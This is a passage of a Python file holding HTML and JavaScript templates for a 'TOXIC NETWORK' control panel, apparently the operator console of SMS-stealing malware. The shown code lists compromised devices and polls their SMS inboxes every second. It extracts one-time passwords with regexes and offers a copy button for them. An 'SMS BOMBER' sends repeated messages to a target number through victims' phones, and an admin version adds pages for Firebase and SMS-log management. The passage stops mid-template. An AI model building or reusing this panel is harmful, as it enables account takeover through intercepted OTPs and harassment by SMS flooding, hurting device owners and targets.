.stat .label{font-size:9px;color:#4a5270;font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:6px;font-family:'Courier New',monospace}
.stat .value{font-size:26px;font-weight:900;letter-spacing:-1px;text-shadow:0 0 15px currentColor}
.stat.total{color:#00e5ff}
.stat.online{color:#00ff41}
.stat.offline{color:#ff3860}
.stat.otp{color:#a855f7}
.quick{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:14px;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}
.quick .info{font-size:12px;color:#7a85a8;letter-spacing:1px;font-family:'Courier New',monospace}
.quick .info b{color:#00ff41;font-size:14px;text-shadow:0 0 8px rgba(0,255,65,.5)}
.list-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;padding:0 4px;gap:8px;flex-wrap:wrap}
.list-header h2{font-size:12px;font-weight:700;color:#00ff41;letter-spacing:2px;text-transform:uppercase;font-family:'Courier New',monospace}
.list-header .count{font-size:11px;color:#00e5ff;background:rgba(0,229,255,.1);border:1px solid rgba(0,229,255,.3);padding:3px 10px;border-radius:4px;font-weight:700;font-family:'Courier New',monospace}
.search-box{margin-bottom:12px}
.search-box input{width:100%;padding:14px 16px;border-radius:8px;border:1.5px solid #1f2937;background:#111827;outline:none;color:#e0e6ff;letter-spacing:1px;font-family:'Courier New',monospace}
.search-box input:focus{border-color:#00ff41;box-shadow:0 0 0 3px rgba(0,255,65,.15)}
.search-box input::placeholder{color:#4a5270}
.num-card{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:14px;margin-bottom:10px;display:flex;align-items:center;gap:12px;cursor:pointer;transition:.15s;min-height:70px;position:relative;overflow:hidden}
.num-card::before{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;background:#00ff41;opacity:0;transition:.2s}
.num-card:hover::before{opacity:1}
.num-card:hover{border-color:rgba(0,255,65,.3);background:#0f1a14}
.num-card:active{transform:scale(.99)}
.num-card.offline::before{background:#ff3860}
.num-card.offline{opacity:.9}
.num-icon{width:42px;height:42px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:19px;flex-shrink:0;background:rgba(0,255,65,.1);border:1px solid rgba(0,255,65,.3);color:#00ff41}
.num-icon.red{background:rgba(255,56,96,.1);border-color:rgba(255,56,96,.3);color:#ff3860}
.num-icon.gray{background:rgba(122,133,168,.1);border-color:rgba(122,133,168,.3);color:#7a85a8}
.num-info{flex:1;min-width:0}
.num-title{font-size:14px;font-weight:700;color:#e0e6ff;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;letter-spacing:.5px;font-family:'Courier New',monospace}
.num-title.unknown{color:#7a85a8;font-style:italic}
.num-title .confidence-badge{font-size:9px;background:rgba(0,255,65,.15);color:#00ff41;padding:2px 6px;border-radius:4px;margin-left:6px;font-weight:700;border:1px solid rgba(0,255,65,.3)}
.num-title .confidence-badge.low{background:rgba(255,215,0,.15);color:#ffd700;border-color:rgba(255,215,0,.3)}
.num-sub{font-size:10px;color:#7a85a8;margin-top:4px;display:flex;gap:4px;flex-wrap:wrap;letter-spacing:.5px;font-family:'Courier New',monospace}
.num-sub .pill{background:#0a0e1a;border:1px solid #1f2937;padding:2px 7px;border-radius:4px;color:#7a85a8;font-size:9px;font-weight:700}
.num-sub .pill.otp{background:rgba(168,85,247,.1);color:#a855f7;border-color:rgba(168,85,247,.3)}
.badge-online{display:flex;align-items:center;gap:5px;font-size:10px;color:#00ff41;font-weight:700;flex-shrink:0;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
.badge-online .dot{width:7px;height:7px;border-radius:50%;background:#00ff41;box-shadow:0 0 8px #00ff41;animation:pulse 1.5s infinite}
.badge-offline{display:flex;align-items:center;gap:5px;font-size:10px;color:#ff3860;font-weight:700;flex-shrink:0;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
.badge-offline .dot{width:7px;height:7px;border-radius:50%;background:#ff3860;box-shadow:0 0 8px #ff3860}
.inbox-header{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:16px;margin-bottom:12px}
.inbox-top{display:flex;align-items:center;gap:10px;margin-bottom:12px}
.back-btn{background:#0a0e1a;border:1px solid #1f2937;width:42px;height:42px;border-radius:8px;font-size:18px;cursor:pointer;color:#00ff41;font-weight:700;text-decoration:none;display:inline-flex;align-items:center;justify-content:center;flex-shrink:0;padding:0;transition:.2s}
.back-btn:hover{background:rgba(0,255,65,.1);border-color:rgba(0,255,65,.4)}
.inbox-num{font-size:16px;font-weight:900;color:#00ff41;letter-spacing:1px;text-shadow:0 0 10px rgba(0,255,65,.5);font-family:'Courier New',monospace}
.inbox-num.unknown{color:#7a85a8;font-style:italic;text-shadow:none}
.inbox-status{display:flex;align-items:center;gap:6px;font-size:10px;color:#00ff41;font-weight:700;margin-top:2px;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
.inbox-status .dot{width:7px;height:7px;border-radius:50%;background:#00ff41;box-shadow:0 0 8px #00ff41;animation:pulse 1.5s infinite}
.inbox-status.offline{color:#ff3860}
.inbox-status.offline .dot{background:#ff3860;box-shadow:0 0 8px #ff3860;animation:none}
.inbox-meta{font-size:10px;color:#4a5270;display:flex;justify-content:space-between;align-items:center;gap:8px;letter-spacing:1px;font-family:'Courier New',monospace}
.refresh-icon{cursor:pointer;font-size:20px;color:#00ff41;user-select:none;padding:6px;min-width:36px;min-height:36px;display:flex;align-items:center;justify-content:center}
.refresh-icon:active{transform:scale(.9)}
.refresh-icon.spinning{animation:spin 1s linear infinite}
.top-number-badge{background:linear-gradient(135deg,rgba(255,215,0,.1),rgba(255,149,0,.1));border:1px solid rgba(255,215,0,.4);border-radius:10px;padding:12px 14px;margin-bottom:12px;display:flex;align-items:center;gap:10px;font-size:12px;font-weight:700;color:#ffd700;box-shadow:0 0 15px rgba(255,215,0,.15);font-family:'Courier New',monospace}
.top-number-badge .tn-icon{font-size:22px;flex-shrink:0;filter:drop-shadow(0 0 8px #ffd700)}
.top-number-badge .tn-info{flex:1;min-width:0}
.top-number-badge .tn-num{font-size:16px;font-weight:900;color:#ffd700;letter-spacing:.5px;word-break:break-all;text-shadow:0 0 8px rgba(255,215,0,.5)}
.top-number-badge .tn-count{font-size:10px;color:#ffd700;font-weight:600;margin-top:2px;opacity:.8;letter-spacing:1px}
.top-number-badge .tn-highlight{background:rgba(255,215,0,.2);color:#ffd700;padding:2px 8px;border-radius:4px;font-weight:900;font-size:10px;border:1px solid rgba(255,215,0,.4)}
.sms-list{background:#111827;border:1px solid #1f2937;border-radius:10px;overflow:hidden}
.sms-item{padding:16px;border-bottom:1px solid #1f2937;position:relative;transition:.2s}
.sms-item:last-child{border-bottom:none}
.sms-item.fresh{background:linear-gradient(90deg,rgba(0,255,65,.08),transparent 60%);border-left:3px solid #00ff41}
.sms-item.otp-item{background:linear-gradient(90deg,rgba(168,85,247,.08),transparent 60%);border-left:3px solid #a855f7}
.sms-item .msg-type-badge{position:absolute;top:10px;right:10px;font-size:9px;font-weight:900;padding:2px 7px;border-radius:4px;letter-spacing:1px;font-family:'Courier New',monospace}
.sms-item .msg-type-badge.otp{background:linear-gradient(135deg,#a855f7,#7c3aed);color:#fff;box-shadow:0 0 10px rgba(168,85,247,.4)}
.sms-item .msg-type-badge.number{background:linear-gradient(135deg,#00ff41,#00e5ff);color:#0a0e1a;box-shadow:0 0 10px rgba(0,255,65,.4)}
.sms-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;gap:8px;flex-wrap:wrap}
.sender{font-size:11px;font-weight:900;color:#ff3860;letter-spacing:.5px;display:flex;align-items:center;flex-wrap:wrap;font-family:'Courier New',monospace;text-transform:uppercase}
.new-badge{background:linear-gradient(135deg,#ff3860,#ff9500);color:#fff;font-size:9px;font-weight:900;padding:2px 7px;border-radius:4px;margin-left:6px;letter-spacing:1px;animation:pulse 1s infinite;box-shadow:0 0 10px rgba(255,56,96,.5)}
.sms-time{font-size:10px;color:#4a5270;font-weight:600;white-space:nowrap;letter-spacing:.5px;font-family:'Courier New',monospace}
.sms-time.fresh{color:#00ff41;font-weight:900}
.time-ago{font-size:9px;color:#4a5270;font-weight:600;margin-top:2px;text-align:right;letter-spacing:.5px;font-family:'Courier New',monospace}
.time-ago.fresh{color:#00ff41}
.sms-body{font-size:13px;color:#c5d0e6;line-height:1.6;word-break:break-word;white-space:pre-wrap;font-family:'Courier New',monospace}
.sms-body .phone-highlight{background:rgba(255,215,0,.15);color:#ffd700;padding:1px 5px;border-radius:3px;font-weight:700;border:1px solid rgba(255,215,0,.3)}
.otp-highlight{background:linear-gradient(135deg,rgba(0,255,65,.2),rgba(0,229,255,.2));color:#00ff41;padding:2px 6px;border-radius:4px;font-weight:900;border:1px solid rgba(0,255,65,.4);text-shadow:0 0 8px rgba(0,255,65,.5)}
.otp-copy-btn{display:inline-flex;align-items:center;gap:6px;margin-top:10px;padding:10px 16px;background:linear-gradient(135deg,#00ff41,#00e5ff);color:#0a0e1a;border:none;border-radius:6px;font-weight:900;font-size:11px;cursor:pointer;letter-spacing:1px;min-height:40px;text-transform:uppercase;font-family:'Courier New',monospace;transition:.2s}
.otp-copy-btn:hover{box-shadow:0 0 20px rgba(0,255,65,.5)}
.otp-copy-btn:active{transform:scale(.96)}
.empty{text-align:center;padding:50px 20px;color:#4a5270;font-size:12px;background:#111827;border:1px solid #1f2937;border-radius:10px;letter-spacing:1px;font-family:'Courier New',monospace}
.loading-text{text-align:center;padding:20px;color:#4a5270;font-size:12px;background:#111827;border:1px solid #1f2937;border-radius:8px;margin-bottom:14px;letter-spacing:1px;font-family:'Courier New',monospace}
.spinner{display:inline-block;width:14px;height:14px;border:2px solid #1f2937;border-top-color:#00ff41;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
.progress-bar{width:100%;height:4px;background:#1f2937;border-radius:2px;overflow:hidden;margin-top:10px}
.progress-fill{height:100%;background:linear-gradient(90deg,#00ff41,#00e5ff);border-radius:2px;transition:width .3s;box-shadow:0 0 10px rgba(0,255,65,.5)}
.live-badge{display:inline-flex;align-items:center;gap:4px;background:rgba(0,255,65,.15);color:#00ff41;font-size:9px;font-weight:700;padding:3px 8px;border-radius:4px;margin-left:6px;letter-spacing:1px;border:1px solid rgba(0,255,65,.3);font-family:'Courier New',monospace}
.live-badge .dot{width:6px;height:6px;border-radius:50%;background:#00ff41;animation:pulse 1.2s infinite;box-shadow:0 0 8px #00ff41}
.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#00ff41;color:#0a0e1a;padding:14px 24px;border-radius:8px;font-weight:900;font-size:13px;box-shadow:0 0 30px rgba(0,255,65,.5);z-index:9999;transition:transform .3s;pointer-events:none;max-width:90vw;text-align:center;letter-spacing:1px;font-family:'Courier New',monospace}
.toast.show{transform:translateX(-50%) translateY(0)}
.hidden{display:none !important}

/* SMS SENDER CSS */
.sms-sender-box{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:20px;margin-bottom:14px;position:relative;overflow:hidden}
.sms-sender-box::before{content:"";position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,#ff3860,#ff9500);opacity:.8}
.sms-sender-box h2{font-size:14px;font-weight:900;color:#ff3860;margin-bottom:14px;letter-spacing:2px;text-transform:uppercase;display:flex;align-items:center;gap:8px;font-family:'Courier New',monospace}
.sms-sender-box label{display:block;font-size:10px;color:#7a85a8;font-weight:700;margin-bottom:6px;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace}
.sms-sender-box select, .sms-sender-box input, .sms-sender-box textarea{width:100%;padding:14px;border-radius:8px;border:1.5px solid #1f2937;background:#0a0e1a;outline:none;color:#e0e6ff;margin-bottom:14px;font-family:'Courier New',monospace;letter-spacing:.5px}
.sms-sender-box select:focus, .sms-sender-box input:focus, .sms-sender-box textarea:focus{border-color:#ff3860;box-shadow:0 0 0 3px rgba(255,56,96,.15)}
.sms-sender-box textarea{resize:vertical;min-height:80px}
.sms-sender-box .btn-row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.sms-sender-box button{padding:14px;border-radius:8px;font-weight:900;font-size:12px;border:none;cursor:pointer;min-height:50px;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;gap:6px;transition:.2s}
.sms-sender-box button:active{transform:scale(.96)}
.sms-sender-box button.send{background:linear-gradient(135deg,#00ff41,#00e5ff);color:#0a0e1a}
.sms-sender-box button.bomb{background:linear-gradient(135deg,#ff3860,#ff9500);color:#fff;box-shadow:0 0 15px rgba(255,56,96,.4)}
.sms-sender-box button.bomb:disabled{opacity:.5;box-shadow:none}
.bomb-count-wrap{display:none;margin-bottom:14px}
.bomb-count-wrap.active{display:block}
</style></head><body>

<div class="topbar">
<div class="brand"><span class="toxic">☣ TOXIC</span> <span class="net">NETWORK</span></div>
<div class="top-actions">
<button class="refresh-btn" id="refresh-btn" onclick="manualRefresh()" title="Refresh">⟳</button>
<div class="conn loading" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
</div>
<div class="nav">
  <a href="#" class="nav-link active" id="tab-num" onclick="switchTab('num')">◉ NUMBERS</a>
  <a href="#" class="nav-link" id="tab-otp" onclick="switchTab('otp')">◈ PERSONAL OTP</a>
  <a href="#" class="nav-link" id="tab-sms" onclick="switchTab('sms')">💣 SMS SENDER</a>
</div>
</div>

<div class="container">

<!-- TAB NUMBERS -->
<div id="view-num">
  <div id="session-banner-wrap"></div>
  <div id="list-view">
  <div class="stats">
  <div class="stat total" id="stat-total"><div class="label">TOTAL</div><div class="value" id="s-total">0</div></div>
  <div class="stat online" id="stat-online"><div class="label">ONLINE</div><div class="value" id="s-online">0</div></div>
  <div class="stat offline" id="stat-offline"><div class="label">OFFLINE</div><div class="value" id="s-offline">0</div></div>
  <div class="stat otp" id="stat-otp"><div class="label">OTP RATE</div><div class="value" id="s-otp">0%</div></div>
  </div>
  <div class="quick"><div class="info">▸ ACTIVE NUMBERS : <b id="q-dev">0</b></div></div>
  <div id="loading-text" class="loading-text"><span class="spinner"></span><span id="loading-msg">INITIALIZING...</span><div class="progress-bar"><div class="progress-fill" id="prog-fill" style="width:0%"></div></div></div>
  <div id="list-content" class="hidden"><div class="search-box"><input id="search-num" placeholder="▸ SEARCH NUMBER / DEVICE" oninput="renderNumbers()"></div><div class="list-header"><h2 id="list-title">◉ ALL NUMBERS <span class="live-badge" id="live-badge" style="display:none"><span class="dot"></span>LIVE</span></h2><span class="count" id="num-count">0</span></div><div id="num-list"></div></div>
  </div>

  <div id="inbox-view" class="hidden">
  <div class="inbox-header">
  <div class="inbox-top"><a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a><div style="flex:1"><div class="inbox-num" id="inbox-num">+91 ------</div><div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">Online</span></div></div></div>
  <div class="inbox-meta"><span id="inbox-meta">⚡ LIVE · AUTO 1S · LATEST 60 SMS</span><span class="refresh-icon" onclick="loadInbox(true)">⟳</span></div>
  </div>
  <div id="top-number-badge" class="top-number-badge hidden">
  <div class="tn-icon">🏆</div>
  <div class="tn-info">
  <div class="tn-num" id="tn-num">-</div>
  <div class="tn-count">MOST FREQUENT SMS NUMBER <span class="tn-highlight" id="tn-count-badge">0x</span></div>
  </div>
  </div>
  <div id="sms-container"></div>
  </div>
</div>

<!-- TAB SMS SENDER -->
<div id="view-sms" class="hidden">
  <div class="sms-sender-box">
    <h2>💣 SMS BOMBER & SENDER</h2>
    
    <label>▸ SELECT DEVICE (SENDER)</label>
    <select id="sms-sender-device"></select>

    <label>▸ ENTER TARGET NUMBER</label>
    <input type="tel" id="sms-target" placeholder="+91 9876543210" autocomplete="off">

    <label>▸ ENTER MESSAGE</label>
    <textarea id="sms-message" placeholder="Type your message here... 😁🔥"></textarea>

    <div class="bomb-count-wrap" id="bomb-count-wrap">
      <label>▸ HOW MANY TIMES? (BOMBER)</label>
      <input type="number" id="sms-count" value="10" min="1" max="50">
    </div>

    <div class="btn-row">
      <button class="send" onclick="sendSms('single')">📩 SEND ONCE</button>
      <button class="bomb" onclick="sendSms('bomb')">💣 BOMBER</button>
    </div>
  </div>
</div>

<!-- TAB PERSONAL OTP -->
<div id="view-otp" class="hidden">
  <div class="sms-sender-box" style="border-color:rgba(168,85,247,.3)">
    <h2 style="color:#a855f7">◈ ADD YOUR FIREBASE</h2>
    <input id="fb-url" placeholder="https://xxx.firebaseio.com" type="url" autocomplete="off">
    <button class="send" style="width:100%" onclick="addFirebase()">ADD</button>
    <div id="add-msg" style="margin-top:10px;font-size:11px;text-align:center;color:#00ff41;display:none"></div>
    <div class="my-fb-list" id="my-fb-list" style="margin-top:14px"></div>
  </div>
</div>

</div>

<div id="toast" class="toast"></div>

<script>
let allNumbers = [];
let numbers = [];
let currentNum = null;
let refreshTimer = null;
let lastSig = '';
let lastInboxSig = '';
let allInboxMsgs = [];
let lastOtpSeen = '';
let notifPermissionAsked = false;
let panelState = {active:true, expires_at:0, passwordless:true, bomber_active:true};

const $ = id => document.getElementById(id);
function toast(text){
  const t = $('toast'); t.textContent = text; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 2500);
}

function switchTab(tab){
  ['num', 'otp', 'sms'].forEach(t => {
    $('view-' + t).classList.add('hidden');
    $('tab-' + t).classList.remove('active');
  });
  $('view-' + tab).classList.remove('hidden');
  $('tab-' + tab).classList.add('active');
  
  if(tab === 'sms') updateSenderDropdown();
}

function updateSenderDropdown(){
  const sel = $('sms-sender-device');
  const onlineDevs = allNumbers.filter(n => n.online === true);
  if(onlineDevs.length === 0){ sel.innerHTML = '<option value="">No online devices found!</option>'; return; }
  sel.innerHTML = onlineDevs.map(n => `<option value="${n.firebase}|${n.device_id}">${n.number} (${n.device_name})</option>`).join('');
}

async function sendSms(mode){
  const devVal = $('sms-sender-device').value;
  const target = $('sms-target').value.trim();
  const msg = $('sms-message').value.trim();
  
  if(!devVal){ toast('❌ No device selected'); return; }
  if(!target){ toast('❌ Target number required'); return; }
  if(!msg){ toast('❌ Message required'); return; }

  const [fb_url, device_id] = devVal.split('|');
  const count = mode === 'bomb' ? parseInt($('sms-count').value) || 1 : 1;

  if(mode === 'bomb' && !panelState.bomber_active){ toast('❌ Bomber disabled by Admin'); return; }

  const btn = mode === 'bomb' ? document.querySelector('.btn-row .bomb') : document.querySelector('.btn-row .send');
  const originalTxt = btn.textContent;
  btn.disabled = true;
  btn.innerHTML = '<span class="spinner" style="border-top-color:#fff"></span>';

  try{
    const r = await fetch('/api/sms/send', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ fb_url, device_id, target, message: msg, count })
    });
    const d = await r.json();
    if(d.success){ toast('✅ SMS SENT: ' + d.count + 'x'); }
    else { toast('❌ ' + (d.error || 'FAILED')); }
  }catch(e){ toast('❌ NETWORK ERROR'); }
  
  btn.disabled = false;
  btn.textContent = originalTxt;
}

async function checkConn(){
  try{
    const r = await fetch('/api/conn');
    const d = await r.json();
    const badge = $('conn-badge');
    const txt = $('conn-text');
    if(d.mongo_connected){ badge.className = 'conn online'; txt.textContent = 'LIVE'; }
    else { badge.className = 'conn offline'; txt.textContent = 'OFF'; }
  }catch(e){}
}

async function loadPanelState(){
  try{
    const r = await fetch('/api/panel/status_public');
    const d = await r.json();
    if(d.success){
      panelState = d;
      const wrap = $('session-banner-wrap');
      if(d.passwordless){
        wrap.innerHTML = '<div class="session-banner"><span class="pulse"></span>🔓 PASSWORDLESS MODE · ACCESS GRANTED</div>';
      } else if(d.expires_at > 0){
        const remaining = Math.max(0, d.expires_at - Math.floor(Date.now()/1000));
        const hrs = Math.floor(remaining/3600);
        const mins = Math.floor((remaining%3600)/60);
        wrap.innerHTML = `<div class="session-banner temp"><span class="pulse"></span>⏱ TEMP ACCESS · ${hrs}h ${mins}m REMAINING</div>`;
      } else { wrap.innerHTML = ''; }
      
      if(!d.bomber_active){ 
        document.querySelector('.btn-row .bomb').disabled = true; 
      } else {
        document.querySelector('.btn-row .bomb').disabled = false; 
      }
    }
  }catch(e){}
}

async function loadNumbers(){
  try{
    const r = await fetch('/api/numbers');
    const d = await r.json();
    if(!d.success){
      if(d.error && d.error.includes('deactivated')){ document.body.innerHTML = '<div style="padding:40px;text-align:center;color:#ff3860;font-family:monospace;font-size:14px">🚫 PANEL DEACTIVATED BY ADMIN</div>'; return; }
      $('loading-msg').textContent = '❌ '+(d.error||'ERROR');
      return;
    }
    allNumbers = d.numbers || [];
    $('s-total').textContent = d.total;
    $('s-online').textContent = d.online;
    $('s-offline').textContent = d.offline;
    $('s-otp').textContent = d.otp_rate + '%';
    $('q-dev').textContent = allNumbers.length;
    if(d.progress){
      const pct = d.progress.total > 0 ? Math.floor(d.progress.done / d.progress.total * 100) : 0;
      $('prog-fill').style.width = pct + '%';
      $('loading-msg').textContent = `SCANNING ${d.progress.done}/${d.progress.total} (${pct}%)...`;
    }
    if(allNumbers.length > 0){
      $('loading-text').classList.add('hidden');
      $('list-content').classList.remove('hidden');
      const sig = allNumbers.length + '|' + d.online + '|' + d.otp_rate;
      if(sig !== lastSig){ lastSig = sig; renderNumbers(); }
    } else if(d.loading){
      $('loading-text').classList.remove('hidden');
    }
  }catch(e){ $('loading-msg').textContent = '❌ NETWORK ERROR'; }
}

function renderNumbers(){
  const q = ($('search-num').value || '').toLowerCase();
  const box = $('num-list');
  const filtered = allNumbers.filter(n => !q || (n.number||'').toLowerCase().includes(q) || (n.device_name||'').toLowerCase().includes(q));
  if(filtered.length === 0){ box.innerHTML = '<div class="empty">📭 NO NUMBERS FOUND</div>'; return; }
  box.innerHTML = filtered.map(n => {
    const isOnline = n.online === true;
    const isUnknown = (n.number || '').startsWith('UNKNOWN-');
    const iconCls = isUnknown ? 'gray' : (isOnline ? '' : 'red');
    const badgeCls = isOnline ? 'badge-online' : 'badge-offline';
    const badgeTxt = isOnline ? 'ONLINE' : 'OFFLINE';
    const titleCls = isUnknown ? 'unknown' : '';
    return `
      <div class="num-card ${isOnline?'':'offline'}">
        <div class="num-icon ${iconCls}" onclick="openInboxGlobal(${allNumbers.indexOf(n)})">${isUnknown ? '?' : '◉'}</div>
        <div class="num-info" onclick="openInboxGlobal(${allNumbers.indexOf(n)})">
          <div class="num-title ${titleCls}">${escapeHtml(n.number)}</div>
          <div class="num-sub"><span class="pill">✉ ${n.msg_count} SMS</span>${n.otp_count > 0 ? `<span class="pill otp">🔑 ${n.otp_count} OTP</span>` : ''}</div>
        </div>
        <div class="${badgeCls}" onclick="openInboxGlobal(${allNumbers.indexOf(n)})"><span class="dot"></span>${badgeTxt}</div>
      </div>`;
  }).join('');
}

function openInboxGlobal(idx){ if(idx < 0 || idx >= allNumbers.length) return; openInbox(allNumbers[idx]); }

async function openInbox(n){
  currentNum = n; lastInboxSig = ''; allInboxMsgs = []; lastOtpSeen = '';
  if('Notification' in window && Notification.permission === 'default'){ Notification.requestPermission(); }
  $('list-view').classList.add('hidden');
  $('inbox-view').classList.remove('hidden');
  $('inbox-num').textContent = n.number;
  if((n.number || '').startsWith('UNKNOWN-')){ $('inbox-num').className = 'inbox-num unknown'; } else { $('inbox-num').className = 'inbox-num'; }
  const statusEl = $('inbox-status'); const statusTxt = $('inbox-status-text');
  if(n.online === true){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'ONLINE'; }
  else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'OFFLINE'; }
  $('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> LOADING...</div>';
  await loadInbox(false);
  if(refreshTimer) clearInterval(refreshTimer);
  refreshTimer = setInterval(()=>loadInbox(false), 1000);
}

async function loadInbox(showLoader){
  if(!currentNum) return;
  if(showLoader){ $('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> REFRESHING...</div>'; }
  try{
    const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase) + '&id=' + encodeURIComponent(currentNum.device_id) + '&num=' + encodeURIComponent(currentNum.number));
    const d = await r.json();
    if(!d.success){ $('sms-container').innerHTML = '<div class="empty">❌ '+(d.error||'ERROR')+'</div>'; return; }
    const msgs = d.messages || []; allInboxMsgs = msgs;
    const sig = msgs.map(m => (m.timestamp||0) + '|' + (m.message||'').slice(0,40)).join('#');
    if(sig !== lastInboxSig){ lastInboxSig = sig; renderMessages(); }
  }catch(e){}
}

function renderMessages(){
  const box = $('sms-container');
  const now = Math.floor(Date.now() / 1000);
  let msgs = [...allInboxMsgs].sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 60);
  if(!msgs.length){ box.innerHTML = '<div class="empty">📭 NO SMS</div>'; return; }
  box.innerHTML = '<div class="sms-list">' + msgs.map(m => {
    const otp = m.otp || extractOtp(m.message);
    let body = otp ? escapeHtml(m.message).replace(otp, `<span class="otp-highlight">${otp}</span>`) : escapeHtml(m.message);
    const copyBtn = otp ? `<button class="otp-copy-btn" onclick="copyOtp('${otp}')">📋 COPY OTP ${otp}</button>` : '';
    const ts = m.timestamp || 0; const isFresh = ts >= (now - 120);
    const timeStr = m.date_string ? m.date_string : fmtTime(ts);
    return `<div class="sms-item ${isFresh?'fresh':''}"><div class="sms-head"><div class="sender">${escapeHtml(m.from || 'UNKNOWN')} ${isFresh?'<span class="new-badge">NEW</span>':''}</div><div class="sms-time">${escapeHtml(timeStr)}</div></div><div class="sms-body">${body}</div>${copyBtn}</div>`;
  }).join('') + '</div>';
}

function backToList(){
  $('inbox-view').classList.add('hidden');
  $('list-view').classList.remove('hidden');
  if(refreshTimer){ clearInterval(refreshTimer); refreshTimer = null; }
  currentNum = null;
}

function extractOtp(text){
  if(!text) return '';
  const t = String(text);
  let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})/i); if(m) return m[1];
  m = t.match(/(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)/i); if(m) return m[1];
  m = t.match(/#(\d{4,8})/); if(m) return m[1];
  return '';
}

function fmtTime(ts){
  if(!ts) return '';
  try{
    let t = parseInt(ts); if(t > 1e12) t = Math.floor(t/1000); if(t < 1e9) return String(ts);
    const d = new Date(t * 1000);
    return d.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true, day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' }).replace(',', ' |');
  }catch(e){ return String(ts); }
}

function copyOtp(code){
  if(navigator.clipboard){ navigator.clipboard.writeText(code).then(()=>toast('✅ COPIED: ' + code)).catch(()=>{}); }
}

function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }

// Personal OTP add firebase
async function addFirebase(){
  const url = $('fb-url').value.trim();
  if(!url) return;
  const r = await fetch('/api/otp/add', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({url}) });
  const d = await r.json();
  if(d.success){ $('add-msg').style.display='block'; $('add-msg').textContent = '✅ ADDED'; $('fb-url').value=''; setTimeout(()=>$('add-msg').style.display='none', 3000); }
  else { toast('❌ ' + d.error); }
}

// Init
checkConn();
loadPanelState();
loadNumbers();
setInterval(checkConn, 8000);
setInterval(loadPanelState, 5000);
setInterval(()=>{ if(!currentNum) loadNumbers(); }, 5000);

// Add event listener for bomber toggle
$('sms-message').addEventListener('focus', () => {
  $('bomb-count-wrap').classList.add('active');
});
</script>
</body>
</html>
"""


# ==================== ADMIN DASHBOARD ====================
ADMIN_DASHBOARD_HTML = USER_DASHBOARD_HTML.replace(
    '<div class="nav">\n  <a href="#" class="nav-link active" id="tab-num" onclick="switchTab(\'num\')">◉ NUMBERS</a>\n  <a href="#" class="nav-link" id="tab-otp" onclick="switchTab(\'otp\')">◈ PERSONAL OTP</a>\n  <a href="#" class="nav-link" id="tab-sms" onclick="switchTab(\'sms\')">💣 SMS SENDER</a>\n</div>',
    '''<div class="nav">
  <a href="/supermasteradmin/dashboard" class="nav-link active">◉ NUMBERS</a>
  <a href="/supermasteradmin/firebases" class="nav-link">🔥 FIREBASES</a>
  <a href="/supermasteradmin/smslogs" class="nav-link">📜 SMS LOGS</a>
  <a href="/supermasteradmin/security" class="nav-link otp">🔒 SECURITY</a>
</div>'''
).replace(
    '<div class="brand"><span class="toxic">☣ TOXIC</span> <span class="net">NETWORK</span></div>',
    '<div class="brand"><span class="toxic">☣ TOXIC</span> <span class="net">NETWORK</span><span style="font-size:9px;background:linear-gradient(135deg,#ff3860,#ff9500);color:#fff;padding:3px 8px;border-radius:4px;margin-left:8px;font-weight:900;vertical-align:middle;letter-spacing:1px;box-shadow:0 0 10px rgba(255,56,96,.5)">👑 ROOT</span></div>'
).replace(
    '<div class="quick"><div class="info">▸ ACTIVE NUMBERS : <b id="q-dev">0</b></div></div>',
    '''<div class="quick">
      <div class="info">▸ FIREBASES : <b id="q-fb">0</b> · NUMBERS : <b id="q-dev">0</b></div>
      <a href="/supermasteradmin/firebases" style="padding:10px 16px;background:linear-gradient(135deg,#ff3860,#ff9500);color:#fff;text-decoration:none;border-radius:6px;font-size:11px;font-weight:900;min-height:44px;display:inline-flex;align-items:center;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace;box-shadow:0 0 15px rgba(255,56,96,.3)">⚙ MANAGE</a>
    </div>'''
).replace(
    '''        <div class="${badgeCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})"><span class="dot"></span>${badgeTxt}</div>
      </div>
    `;
  }).join('');
}

function openInboxGlobal(idx){
  if(idx < 0 || idx >= numbers.length) return;
  openInbox(numbers[idx]);
}''',
    '''        <div class="card-actions">
